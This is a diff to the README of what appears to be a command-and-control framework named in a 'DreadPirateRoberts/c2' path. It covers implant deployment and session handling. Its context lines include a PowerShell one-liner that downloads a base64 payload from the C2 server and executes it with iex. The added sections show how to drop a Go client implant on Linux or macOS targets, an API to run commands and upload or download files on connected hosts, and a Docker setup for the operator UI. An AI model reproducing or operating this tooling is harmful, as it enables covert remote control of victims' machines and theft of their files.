@@ -24,6 +24,8 @@ Create or edit `server/config.json`:
 - **sync_token** – If set, GET /sync only returns the payload when the request includes `?k=<sync_token>`. Use this in your macro URL: `https://HOSTPORT/sync?k=YOUR_TOKEN`.
 - **op_token** – If set, GET /op/sessions and POST /op/exec require header `X-Op-Token: <op_token>` or query `?k=<op_token>`.
 
+Session history is persisted to `c2_sessions.jsonl` in the server directory (append-only log of join/leave events). After a restart, live sessions are lost but you can see who was connected via **GET /op/sessions/history** (last 100 sessions, `id`, `addr`, `first_seen`, `last_seen`).
+
 Example:
 
 ```json
@@ -59,6 +61,9 @@ On a Windows box, run the loader (replace HOSTPORT and add `?k=TOKEN` if you use
 $b=(New-Object Net.WebClient).DownloadString('https://HOSTPORT/sync')
 iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))
 ```
+
+**Option D: Linux/macOS (Go client)**  
+Copy the built `client` binary and `server.crt` (and optionally `config.json`) to the target. Create `config.json` with `server_url: wss://YOUR_SERVER:8443/live`, `client_id`, and `client_secret` matching the server. Run `./client`. If the target has Go installed, you can instead build there: clone the repo, `cd client && go build -o client .`, then run with the same config.
 
 When the implant connects, the server logs: `session xxxxxxxx connected`.
 
@@ -136,14 +141,44 @@ Open http://localhost:3000. **Clients** lists sessions (from GET /op/sessions). 
 - **GET /op/health** – Same auth as other /op. Returns `{"ok": true, "sessions": N}`. Use for Dashboard or load balancers.
 - **POST /op/kill** – Body `{"session_id": "..."}`. Closes the WebSocket and removes the session. Use to drop a beacon.
 
+## 9. File API (upload, download, listdir)
+
+Same auth as other /op (X-Op-Token or ?k=). Requires implant support (Go client and PowerShell implant support these).
+
+- **POST /op/upload** – Body `{"session_id": "...", "path": "C:\\path\\to\\file", "content": "<base64>"}`. Response: `{"status", "output", "error"}`.
+- **POST /op/download** – Body `{"session_id": "...", "path": "C:\\path\\to\\file"}`. Response: `{"status", "output", "error"}`; `output` is file content as base64.
+- **POST /op/listdir** – Body `{"session_id": "...", "path": "."}`. Response: `{"status", "output", "error"}`; `output` is JSON array of `{name, dir, size}`.
+
+See `web-ui/WEB_UI_API.md` for full details.
+
+## 10. Run with Docker (C2 + UI)
+
+To run only the C2 server and Web UI in Docker (no API gateway, db, or redis):
+
+```bash
+# From repo root (e.g. DreadPirateRoberts/c2). Generate certs first if not done:
+cd DreadPirateRoberts/c2 && ./build.sh
+# Then from that c2 directory:
+docker-compose -f docker/docker-compose.c2-only.yml up --build
+```
+
+- **C2 server:** https://localhost:8443 (self-signed cert; accept in browser when the UI calls the API).
+- **Web UI:** http://localhost:3000 — open this in your browser. The UI is built to call https://localhost:8443.
+
+If the server uses `op_token`, rebuild the web-ui with build arg `REACT_APP_OP_TOKEN=your-key` (e.g. in the compose file or via `docker-compose build --build-arg REACT_APP_OP_TOKEN=your-key web-ui`).
+
 ## Quick reference
 
-| Item        | Value                          |
-|------------|---------------------------------|
-| Sync URL   | `https://HOST:8443/sync` or `.../sync?k=TOKEN` |
-| View URL   | `https://HOST:8443/view`        |
-| WebSocket  | `wss://HOST:8443/live`          |
-| List API   | `GET /op/sessions`              |
-| Health API | `GET /op/health`               |
-| Exec API   | `POST /op/exec` body `{"session_id","command"}` |
-| Kill API   | `POST /op/kill` body `{"session_id"}` |
+| Item          | Value |
+|---------------|--------|
+| Sync URL      | `https://HOST:8443/sync` or `.../sync?k=TOKEN` |
+| View URL      | `https://HOST:8443/view` |
+| WebSocket     | `wss://HOST:8443/live` |
+| GET /op/sessions | List `{id, addr}` (live only) |
+| GET /op/sessions/history | List `{id, addr, first_seen, last_seen}` (last 100, persisted) |
+| GET /op/health   | `{ok, sessions}` |
+| POST /op/exec    | Body `{"session_id","command"}` |
+| POST /op/kill    | Body `{"session_id"}` |
+| POST /op/upload  | Body `{"session_id","path","content"}` (content base64) |
+| POST /op/download| Body `{"session_id","path"}`; response output = base64 file |
+| POST /op/listdir | Body `{"session_id","path"}`; response output = JSON list |
